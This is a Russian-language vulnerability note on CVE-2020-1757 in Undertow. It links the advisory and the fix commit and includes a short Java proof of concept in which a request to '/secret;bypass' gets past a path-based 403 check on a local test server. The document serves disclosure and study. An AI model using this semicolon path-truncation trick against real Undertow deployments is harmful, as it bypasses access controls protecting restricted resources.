# Обзор #

## Описание уязвимости на github asvisory: ##
https://github.com/advisories/GHSA-2w73-fqqj-c92p

## Описание уязвимости: ##
Во всех версиях undertow-2.x.x SP1 до undertow-2.0.30.SP1, во всех версиях undertow-1.x.x и undertow-2.x.x до undertow-2.1.0.Final была обнаружена уязвимость, при которой контейнер сервлета приводит к неправильной нормализации servletPath, обрезая путь после точки с запятой, что может привести к сопоставлению приложения и, как следствие, к обходу безопасности.

## public метод пакета приводящий к уязвимости ##
CVE-2020-1757 - java.lang.String.substring

### final class HttpServerExchange ###

~~~java
public String getRequestPath()
~~~

### Репозиторий проекта с уязвимостью: ###
https://github.com/undertow-io/undertow

## PoC: ##
~~~java
public static void main(String[] args) throws IOException {
        Undertow server = Undertow.builder()
                .addHttpListener(8080, "localhost")
                .setHandler(new HttpHandler() {
                    @Override
                    public void handleRequest(HttpServerExchange exchange) {
                        String path = exchange.getRequestPath();
                        if (path.startsWith("/secret")) {
                            exchange.setStatusCode(403);
                            exchange.getResponseSender().send("Access denied");
                        } else {
                            exchange.getResponseSender().send("Public resource");
                        }
                    }
                }).build();
        server.start();

        // Тест: Проверка обхода пути через ;
        testRequest("http://localhost:8080/secret;bypass");

        server.stop();
    }

    private static void testRequest(String url) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
        connection.setRequestMethod("GET");
        int responseCode = connection.getResponseCode();
        String content = new String(connection.getInputStream().readAllBytes());

        System.out.println("URL: " + url);
        System.out.println("Response Code: " + responseCode);
        System.out.println("Content: " + content + "\n");
    }
~~~


## Коммиты, исправившие уязвимость: ##
https://github.com/undertow-io/undertow/commit/2291c7c07dc5bccf3b45c4db3a1b63123b8ce484

https://osv.dev/vulnerability/CVE-2020-1757